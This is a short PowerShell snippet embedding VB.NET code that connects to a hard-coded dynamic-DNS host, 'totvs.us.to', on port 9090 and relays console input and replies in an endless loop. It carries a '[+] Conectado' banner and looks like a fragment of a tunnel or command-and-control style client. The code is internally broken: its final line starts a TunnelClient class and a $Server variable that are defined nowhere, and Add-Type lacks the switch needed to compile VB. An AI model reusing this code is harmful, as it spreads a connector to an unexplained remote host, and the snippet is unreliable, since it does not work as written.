


Add-Type @"

Imports System.Net.Sockets
Imports System.Text

Module Client

    Sub Main()
        Dim serverIP As String = "totvs.us.to"
        Dim port As Integer = 9090

        Dim client As New TcpClient(serverIP, port)
        Dim stream = client.GetStream()

        Console.WriteLine("[+] Conectado al servidor")

        While True
            Console.Write("> ")
            Dim msg = Console.ReadLine()

            Dim data = Encoding.UTF8.GetBytes(msg)
            stream.Write(data, 0, data.Length)

            Dim buffer(4095) As Byte
            Dim bytesRead = stream.Read(buffer, 0, buffer.Length)

            Dim response = Encoding.UTF8.GetString(buffer, 0, bytesRead)
            Console.WriteLine(response)
        End While

    End Sub

End Module

"@



[TunnelClient]::Start($Server).GetAwaiter().GetResult()
